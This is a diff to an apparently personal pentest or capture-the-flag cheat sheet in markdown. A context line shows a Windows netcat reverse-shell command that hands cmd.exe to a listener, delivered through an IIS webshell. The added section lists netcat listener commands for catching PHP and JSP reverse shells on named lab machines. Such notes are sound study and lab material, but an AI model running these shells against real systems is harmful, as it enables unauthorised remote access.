@@ -67,3 +67,12 @@ C:\Windows\Temp\nc.exe LHOST 4444 -e cmd.exe
 Used on: **Relevant** — delivered through an IIS-executed `.asp` webshell. Full chain: [smb-write-iis-execution.md](../../exploits/web-rce/smb-write-iis-execution.md).
 
 
+
+### Listeners for PHP/JSP reverse shells
+```bash
+nc -nlvp 8080
+nc -lvnp 4444
+nc -lvpn 4444
+nc -nlvp 4545
+```
+Used on: **bsidesgtdav**, **bsidesgtthompson**, **coldvvars** - listeners for PHP WebDAV shell, JSP WAR shell, uploaded PHP shell, and the secondary `:!bash` shell.
